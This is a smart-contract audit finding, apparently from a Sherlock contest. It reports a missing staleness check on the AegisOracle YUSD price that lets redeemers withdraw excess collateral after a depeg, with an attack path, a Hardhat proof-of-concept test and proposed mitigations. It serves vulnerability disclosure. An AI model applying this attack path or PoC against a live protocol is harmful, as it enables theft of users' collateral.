# missing staleness check in `AegisOracle` can lead to collateral asset being stolen from the protocol if stale price is used when YUSD depeg from 1 dollar

### Summary

When AegisOracle is used for price calculations only the `AegisOracle::yusdUSDPrice` is used which can lead to stale prices being reported, since the `_priceData.timestamp` is not utilised for validation.

### Root Cause

At [AegisMinting.sol#L822](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L822) only the YUSD price is used from the oracle which can lead to stale prices being reported and ultimately false calculations being made potentially highly affect the redeem flow and resulting in collateral assets being stolen from the protocol.

### Internal Pre-conditions

1. AegisOracle is not updated after a price depeg
2. if `whitelistEnabled` is set to `true` only whitelisted users can execute the attack, but considering how is easy is to bypass KYC this is not a huge limiting factor. If `whitelistEnabled` is set to `false` anyone can exploit it.

### External Pre-conditions

1. YUSD depeg from 1 USD

### Attack Path

1. YUSD depeg and attacker buys YUSD let's say at 0.6 USD price for $100
2. attacker submits a requestReedem order
3. [_getAssetYUSDPriceOracle](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L770) will use the stale USD price if not updated frequently -> calculates incorrect collateral amount based on stale price (it should calculate $60 worth but since it's not updated it will calculate the full $100)
4. attacker obtains more collateral and effectively stealing from the protocol

### Impact

If the oracle wasn't updated frequently (stale price is set on the oracle) and the YUSD price depeg from 1 dollar it can lead to unwanted scenarios. Let's say the oracle still reports 1 USD/YUSD but the YUSD depegged to 0.6 which can lead to attackers taking advantage of this. Buying a lot of YUSD on the market then submit a requestReedem where they can successfully take more collateral out which would be actually allowed and effectively stealing from the protocol.

### PoC

Paste the following test bellow [6_aegis_minting_redeem.spec.ts#L706](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/test/6_aegis_minting_redeem.spec.ts#L706) into the `success` cases. The test demonstrates the attack.

```typescript
it('attacker can withdraw more collateral if AegisOracle pricefeed is not updated', async () => {
        const [owner, attacker] = await ethers.getSigners()

        const { aegisMintingContract, aegisMintingAddress, assetAddress, assetContract, yusdContract, aegisConfig } = await loadFixture(deployFixture)

        await aegisMintingContract.grantRole(FUNDS_MANAGER_ROLE, owner)
        // attacker needs to be whitelisted because whitelistEnabled is set to true
        await aegisConfig['whitelistAddress(address,bool)'](attacker, true)

        const feedRegistry = await ethers.deployContract('FeedRegistry')
        await aegisMintingContract.grantRole(SETTINGS_MANAGER_ROLE, owner)
        await aegisMintingContract.setFeedRegistryAddress(feedRegistry)
        // chainlink feed
        await feedRegistry.setPrice(assetContract, USD_FEED_ADDRESS, '100000000')

        const aegisOracle = await ethers.deployContract('AegisOracle', [[owner], owner])
        await aegisOracle.setOperator(owner, true)
        await aegisMintingContract.setAegisOracleAddress(aegisOracle)
        // aegis oracle
        await aegisOracle.updateYUSDPrice('100000000')

        const collateralAmount = ethers.parseEther('100')
        // Mint asset funds simulating deposited collateral
        await assetContract.mint(aegisMintingContract, collateralAmount)

        // forward time
        await time.increase(3600)

        // let's say YUSD depeged and the price is 0.6 USD/YUSD
        // AegisOracle price is not updated

        await yusdContract.setMinter(owner)
        // simulate attacker swapped 100 YUSD just for 60 USD
        const yusdAmount = ethers.parseEther('100') // worth only 60 USD
        await yusdContract.mint(attacker,  yusdAmount)
        await yusdContract.setMinter(aegisMintingAddress)
        // Approve YUSD for AegisMinting contract from attacker
        await yusdContract.connect(attacker).approve(aegisMintingAddress, yusdAmount)

        const requestId = 'test'
        const redeemOrder = {
          orderType: OrderType.REDEEM,
          userWallet: attacker.address,
          collateralAsset: assetAddress,
          collateralAmount: collateralAmount,
          yusdAmount: yusdAmount,
          slippageAdjustedAmount: yusdAmount,
          expiry: (await time.latest()) + 10000,
          nonce: Date.now(),
          additionalData: encodeString(requestId),
        }
        const signature = await signOrder(redeemOrder, aegisMintingAddress)

        // attacker creates a requestRedeem -> _getAssetYUSDPriceOracle uses stale price
        await expect(aegisMintingContract.connect(attacker).requestRedeem(redeemOrder, signature)).to.be.not.reverted

        const contractYUSDBalanceBefore = await yusdContract.balanceOf(aegisMintingContract)
        const userAssetBalanceBefore = await assetContract.balanceOf(attacker)

        // if priceFeed still not updated approveRedeemRequest will send out the 100 USD worth of collateral
        await expect(aegisMintingContract.approveRedeemRequest(requestId, collateralAmount)).to.
          emit(aegisMintingContract, 'ApproveRedeemRequest').
          withArgs(requestId, owner.address, attacker.address, assetAddress, collateralAmount, yusdAmount, 0).
          emit(yusdContract, 'Transfer').
          withArgs(aegisMintingContract, ethers.ZeroAddress, yusdAmount).
          emit(assetContract, 'Transfer').
          withArgs(aegisMintingContract, attacker, collateralAmount)

        const redeemRequest = await aegisMintingContract.getRedeemRequest(requestId)

        await expect(yusdContract.balanceOf(aegisMintingContract)).to.be.eventually.equal(contractYUSDBalanceBefore - yusdAmount)
        // successful exploit attacker got additional 40 USD worth of collateral because of the possible stale price being reported
        await expect(assetContract.balanceOf(attacker)).to.be.eventually.equal(userAssetBalanceBefore + collateralAmount)
        expect(redeemRequest.status).to.be.equal(RedeemRequestStatus.APPROVED)
      })
```

then run
```sh
npx hardhat test test/6_aegis_minting_redeem.spec.ts --grep 'attacker can withdraw more collateral if AegisOracle pricefeed is not updated'
```

### Mitigation

I have two mitigation proposals:

1. Since YUSD price should be reported accurate on every call the best would be to move to a similar flow what the chainlink price feed is doing. So when calling `AegisOracle::yusdUSDPrice()` it should return both `_priceData.price` and `_priceData.timestamp`. Additionally a heartbeat variable should be set on AegisOracle signalling how often price updates should happen and this would allow in `_getAssetYUSDPriceOracle` to validate the price data similarly how it is done in [_getAssetUSDPriceChainlink](https://github.com/sherlock-audit/2025-04-aegis-op-grant/blob/4aceb235db96b2299bb95ebf16e83a24f987bf3e/aegis-contracts/contracts/AegisMinting.sol#L812). 

    I assume the updates in AegisOracle happens through an automated service, which can happen to go down or run out of gas etc so the proposed mitigation would allow to act as a safety net in case of something bad happens. 

2. An alternative solution would be is to ditch AegisOracle and rely on the UniV3/V4 on chain oracle for `_getAssetYUSDPriceOracle` which would allow the team to remove the automated oracle service, reducing the external dependencies and potential exploit factors (for eg compromised AegisOracle operator).
